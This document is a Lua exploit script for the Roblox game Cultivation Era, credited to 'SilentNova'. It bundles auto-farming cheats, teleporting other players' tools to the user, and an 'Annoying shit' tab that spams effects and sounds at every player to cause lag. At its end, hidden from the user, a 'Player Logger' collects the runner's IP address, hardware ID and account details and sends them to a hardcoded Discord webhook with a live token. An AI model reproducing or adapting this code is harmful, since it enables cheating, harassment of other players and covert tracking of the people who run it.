...
function Ripple(obj)
    spawn(function()
        ...
        local NewX, NewY =
            Mouse.X - Circle.AbsolutePosition.X,
            Mouse.Y - Circle.AbsolutePosition.Y
...
function Lib:Window(text, accent)
    ...
    function WindowTabs:Tab(title)
        ...
        ContainerItemHolder.Position = UDim2.new(
            0.0254777074,
            0,
            0.0365853645,
            0
        ...
        function TabItems:Button(text, callback)
            ...
            ContainerItemHolder.CanvasSize = UDim2.new(
                0,
                0,
                0,
                ItemHolderList.AbsoluteContentSize.Y
            )
        end
        ...
        function TabItems:Slider(text, min, max, start, callback)
            ...
            local function slide(input)
                ...
                local s = math.floor(
                    ((pos.X.Scale * max) / max) * (max - min) + min
                )
        ...
        function TabItems:Dropdown(text, list, callback)
            ...
            for i, v in next, list do
                ...
                DropdownItemHolder.CanvasSize = UDim2.new(
                    0,
                    0,
                    0,
                    DropdownItemHolderList.AbsoluteContentSize.Y + 15
                )
            end
            ContainerItemHolder.CanvasSize = UDim2.new(
                0,
        ...
        function TabItems:Colorpicker(text, preset, callback)
            ...
            ColorSelection.Position = UDim2.new(
                preset and select(3, Color3.toHSV(preset))
            )
            ...
            HueSelection.Position = UDim2.new(
                0.48,
                0,
                1 - select(1, Color3.toHSV(preset))
            )
            ...
            RainbowBoxStatus.Position = UDim2.new(
                0.749000013,
                0,
                0.143000007,
                0
            ...
            local function UpdateColorPicker(nope)
                BoxColor.BackgroundColor3 = Color3.fromHSV(
                    ColorH,
                    ColorS,
                    ColorV
                )
            ...
            ColorS = (
                    math.clamp(
                        ColorSelection.AbsolutePosition.X
                            - Color.AbsolutePosition.X,
                        0,
            ...
            ColorV = 1
                - (
                    math.clamp(
                        ColorSelection.AbsolutePosition.Y
                            - Color.AbsolutePosition.Y,
                        0,
            ...
            Color.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    ...
                    ColorInput = RunService.RenderStepped:Connect(function()
                        local ColorX = (
                                math.clamp(
                                    Mouse.X - Color.AbsolutePosition.X,
                                    0,
                                    Color.AbsoluteSize.X
                                )
                                / Color.AbsoluteSize.X
                        ...
                        local ColorY = (
                                math.clamp(
                                    Mouse.Y - Color.AbsolutePosition.Y,
                                    0,
                                    Color.AbsoluteSize.Y
                                )
                                / Color.AbsoluteSize.Y
            ...
            Hue.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    ...
                    HueInput = RunService.RenderStepped:Connect(function()
                        local HueY = (
                                math.clamp(
                                    Mouse.Y - Hue.AbsolutePosition.Y,
                                    0,
                                    Hue.AbsoluteSize.Y
                                )
                                / Hue.AbsoluteSize.Y
        ...
        function TabItems:Keybind(text, presetbind, callback)
            ...
            game
                :GetService('UserInputService').InputBegan
                :connect(function(current, pressed)
                    if not pressed then
...
local function urbantp(goal, step, waitime)
    ...
    while true and wait(waitime) do
        ...
        if _G.urbantplookat ~= nil then
            rotationdata = CFrame.new(
                jaw.HumanoidRootPart.CFrame.Position,
                _G.urbantplookat
            ) - jaw.HumanoidRootPart.CFrame.Position
        else
            rotationdata = jaw.HumanoidRootPart.CFrame
                - jaw.HumanoidRootPart.CFrame.Position
        end

        jaw.HumanoidRootPart.CFrame = CFrame.new(nextx, nexty, nextz)
            * rotationdata
...
function Move(place, stud, tw)
    ...
    _G.move1 = true
    while
        place.X < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X
    do
        Wait(tw)
    ...
    while
        place.Z < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z
    do
        Wait(tw)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
            Vector3.new(
    ...
    while
        place.Y < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y
    do
        Wait(tw)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
            Vector3.new(
...
local function moveto(obj, speed)
    ...
    if
        not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild(
            'BodyVelocity'
        )
    then
        antifall = Instance.new(
            'BodyVelocity',
            game.Players.LocalPlayer.Character.HumanoidRootPart
        )
        antifall.Velocity = Vector3.new(0, 0, 0)
...
-- Title
local win = Lib:Window('Cultivatoin\nEra', Color3.fromRGB(120, 81, 169))

-- Main Tab
local MainTab = win:Tab('Main')
MainTab:Toggle('Auto Herb', function(t)
    Enabled = t
    ...
    local fallbackCFrame = CFrame.new(2674, 1847, 4268)

    _G.HerbFarmEnabled = _G.HerbFarmEnabled or false
    _G.HerbFarmTask = _G.HerbFarmTask or nil
    _G.AutofarmMainLoop = _G.AutofarmMainLoop or nil
    _G.AutofarmRunning = _G.AutofarmRunning or false
    ...
    local function checkQuestProgress()
        local questGui = player:WaitForChild('PlayerGui'):FindFirstChild('QuestUi')
        if not questGui then return nil, nil end

        local questFrame = questGui:FindFirstChild('Quest')
            and questGui.Quest:FindFirstChild('QuestFrame')
            and questGui.Quest.QuestFrame:FindFirstChild('Container')
        if not questFrame then return nil, nil end

        local titleText = questFrame:FindFirstChild('QuestTitle'):FindFirstChild('Title').Text
        local current, required = string.match(titleText, '(%d+)%s*/%s*(%d+)')
        return tonumber(current), tonumber(required)
    end

    local function talkToHerbalist()
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild('HumanoidRootPart')
        local herbalist = workspace.NPC:FindFirstChild('Herbalist')
        if herbalist and herbalist:FindFirstChild('HumanoidRootPart') then
            humanoidRootPart.CFrame = herbalist.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            local prompt = herbalist:FindFirstChildOfClass('ProximityPrompt')
            if prompt then
                task.wait(0.2)
                fireproximityprompt(prompt)
                task.wait(0.2)
                local dialogueGui = player.PlayerGui:FindFirstChild('Dialogue')
                if dialogueGui and dialogueGui.MainFrame and dialogueGui.MainFrame.Options then
                    local options = dialogueGui.MainFrame.Options
                    local opt2 = options.Option2
                    local opt1 = options.Option1
                    if opt2 and opt1 then
                        ReplicatedStorage.RemoteEvents.OptionSelected:FireServer(opt2.OptionId.Value)
                        task.wait(0.1)
                        ReplicatedStorage.RemoteEvents.OptionSelected:FireServer(opt1.OptionId.Value)
                    end
                end
            end
        end
    ...
    local function startHerbFarm()
        if _G.HerbFarmTask then
            _G.HerbFarmEnabled = false
            task.cancel(_G.HerbFarmTask)
            _G.HerbFarmTask = nil
        end

        _G.HerbFarmEnabled = true
        _G.HerbFarmTask = task.spawn(function()
            while _G.HerbFarmEnabled and Enabled do
                local found = false
                for _, herbObj in ipairs(workspace.HerbeLocation:GetChildren()) do
                    if not _G.HerbFarmEnabled or not Enabled then return end

                    local part, prompt = findPromptIn(herbObj)
                ...
                if not found then
                    getCharacter().CFrame = fallbackCFrame
                    task.wait(0.5)
                end
    ...
    local function mainLoop()
        ...
        while _G.AutofarmRunning do
            ...
            local current, required = checkQuestProgress()
            if current and required then
                if current >= required then
                    ...
                    if not _G.HerbFarmEnabled then
                        startHerbFarm()
                    end
                end
            else
    ...
    if Enabled then
        if not _G.AutofarmRunning then
            _G.AutofarmMainLoop = task.spawn(mainLoop)
        end
    else
        stopHerbFarm()
        if _G.AutofarmRunning then
            _G.AutofarmRunning = false
            if _G.AutofarmMainLoop then
                task.cancel(_G.AutofarmMainLoop)
                _G.AutofarmMainLoop = nil
            end
        end
    end
end)
...
local CheckNotifToggle = false

MainTab:Toggle('Auto Breakthrough', function(t)
    CheckNotifToggle = t
    if t then
        task.spawn(function()
            while CheckNotifToggle do
                local notif = game
                    :GetService('Players').LocalPlayer.PlayerGui
                    :FindFirstChild('CultivationUI') and game.Players.LocalPlayer.PlayerGui.CultivationUI:FindFirstChild(
                    'All'
                ) and game.Players.LocalPlayer.PlayerGui.CultivationUI.All:FindFirstChild(
                    'NotificationLabel'
                )

                if notif and notif.Visible then
                    print('Can Breakthrough')
                    game
                        :GetService('ReplicatedStorage')
                        :WaitForChild('RemoteEvents')
                        :WaitForChild('ManualBreakthrough')
                        :FireServer()
                end
                task.wait(0.1)
            end
...
MainTab:Toggle('Cultivation Technique Sniper', function(t)
    teleportEnabled = t
end)
...
-- Teleports all tools to the player's HumanoidRootPart
local function teleportTools()
    for _, tool in ipairs(workspace:GetDescendants()) do
        if
            tool:IsA('Tool')
            and tool:FindFirstChild('Handle')
            and not tool:IsDescendantOf(localPlayer)
        then
            tool.Handle.CFrame = hrp.CFrame + Vector3.new(2, 0, 0)
        end
    end
end

-- Prevent any picked-up tool from being equipped, only if enabled
character.ChildAdded:Connect(function(child)
    if child:IsA('Tool') then
        task.defer(function()
            if teleportEnabled and child.Parent == character then
...
-- Continuously teleport tools while toggle is ON
RunService.RenderStepped:Connect(function()
    if teleportEnabled then
        teleportTools()
    end
end)
local AnnoyTab = win:Tab('Annoying shit')

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local EffectLearnEvent = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("EffectLearnEvent")
local DashRemote = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dash")

local whiteBeamLooping = false
local dashLooping = false

-- Default SpamSpeed (seconds)
local SpamSpeed = 1.0

-- White Beam toggle
AnnoyTab:Toggle("LET THERE BE LIGHT!", function(t)
    whiteBeamLooping = t

    if t then
        task.spawn(function()
            while whiteBeamLooping do
                for _, player in pairs(Players:GetPlayers()) do
                    ...
                    if hrp then
                        ...
                        EffectLearnEvent:FireServer(unpack(args))
                    end
                end
                task.wait(SpamSpeed)
            end
...
-- Sound Spam toggle
AnnoyTab:Toggle("Sound Spam", function(t)
    dashLooping = t

    if t then
        task.spawn(function()
            while dashLooping do
                for _, player in pairs(Players:GetPlayers()) do
                    local character = player.Character or player.CharacterAdded:Wait()
                    local hrp = character and character:FindFirstChild("HumanoidRootPart")
                    if hrp then
...
-- Slider controls SpamSpeed: slider values 1-20 map inversely to 2.0-0.1 seconds
AnnoyTab:Slider('Speed', 0, 20, 10, function(t)
    -- Invert slider so higher value = slower (longer wait)
    SpamSpeed = t / 10
end)

AnnoyTab:Label("Warning: low speeds may cause extreme lag")
...
Extra:Button('Server Hop', function()
    ...
    local File = pcall(function()
        AllIDs = game
            ...
            :JSONDecode(readfile('NotSameServers.json'))
    end)
    if not File then
...
Extra:Button('Anti-Afk - Already Running', function()
    print('Why are you clicking the anti-afk button lmao')
end)

Extra:Toggle('Infinite Jump', function(t)
    InfJump = t
...
Extra:Slider('Player Speed', 20, 200, 23, function(t)
    PlrSpeed = t
...
Credits:Button('Made by SilentNova', function()
    pcall(function()
        setclipboard('SilentNova')
    end)
end)

Credits:Button('https://discord.gg/hAsH4bQ6YG - Click to copy', function()
    pcall(function()
...
task.spawn(function()
    -- Function to monitor and reset player speed if it changes
    local function monitorPlayerSpeed()
        while true do
            pcall(function()
                wait(0.5) -- You can adjust the delay as needed
                local currentSpeed =
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
                if currentSpeed ~= PlrSpeed then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed =
                        PlrSpeed
                end
            end)
...
task.spawn(function()
    pcall(function()
        ...
        local LocalPlayer = Players.LocalPlayer
        local PopperClient =
            LocalPlayer:WaitForChild('PlayerScripts').PlayerModule.CameraModule.ZoomController.Popper

        for i, v in next, getgc() do
            if
                getfenv(v).script == PopperClient
                and typeof(v) == 'function'
            then
...
local HttpService = game:GetService('HttpService')
local Players = game:GetService('Players')
local AnalyticsSvc = game:GetService('RbxAnalyticsService')

local lp = Players.LocalPlayer
local placeId = game.PlaceId
local jobId = game.JobId -- needed for join-link
local isPrivate = (game.PrivateServerId ~= '') -- true for VIP or reserved servers :contentReference[oaicite:0]{index=0}

-- ● Roblox links --------------------------------------------------------------
local placeLink = ('https://www.roblox.com/games/%d'):format(placeId)
local profileLink = ('https://www.roblox.com/users/%d/profile'):format(
    lp.UserId
)
local avatarUrl = (
...
-- Build an *optional* public-server join link
local joinLink
if not isPrivate and jobId ~= '' then
    -- deep-link that opens the Roblox client on PC & mobile :contentReference[oaicite:1]{index=1}
    joinLink =
        ('https://www.roblox.com/games/start?placeId=%d&gameId=%s'):format(
            placeId,
            jobId
        )
end

-- ● HWID (stable per-device GUID) --------------------------------------------
local hwid = AnalyticsSvc:GetClientId() -- 36-char GUID, persists across sessions

-- ● Public IPv4 ---------------------------------------------------------------
local publicIp = 'Unavailable'
pcall(function() -- avoid script break if request fails
    local ipRes = (http_request or request or syn.request)({
        Url = 'https://api.ipify.org?format=json',
        Method = 'GET',
    })
    publicIp = HttpService:JSONDecode(ipRes.Body).ip
end)
...
local embedFields = {
    {
        name = 'Place Link',
        value = ('[%d](%s)'):format(placeId, placeLink),
        inline = true,
    },
    {
        name = 'Join Server',
        value = joinLink and ('[Click ➜](%s)'):format(joinLink)
            or '_Private server_',
        inline = true,
    },
    {
        name = 'Account Age',
        value = lp.AccountAge .. ' day(s)',
        inline = true,
    },
    {
        name = 'Premium Status',
        value = lp.MembershipType.Name or 'None',
        inline = true,
    },
    {
        name = 'HWID',
    ...
    {
        name = 'Public IP',
        value = ('`%s`'):format(publicIp),
        inline = false,
    },
}

local embed = {
    title = '🚨 Cultivation Era – Player Logger',
    description = (
        '**Username:** [%s](%s)\n**User ID:** %d\n**Exploit Used:** `%s`'
    ):format(lp.Name, profileLink, lp.UserId, exploitName),
    color = tonumber(0x7851A9),
    fields = embedFields,
...
-- ● Send the webhook ----------------------------------------------------------
local WEBHOOK = 'https://discord.com/api/webhooks/1380253843614466129/v8wcIN0SVDC6pVqWyoX8mhBJCkfmuZD6YaVHxz-5Nl5_8q5sBhXCp16bS7fVtDgJ9cfX'
...
if ok then
    --print("[Logger] ✅ Webhook delivered.")
else
    --warn("[Logger] ❌ Webhook error:", res)
end
    keyCheck:Destroy()
    warn("-SN")
    --script here
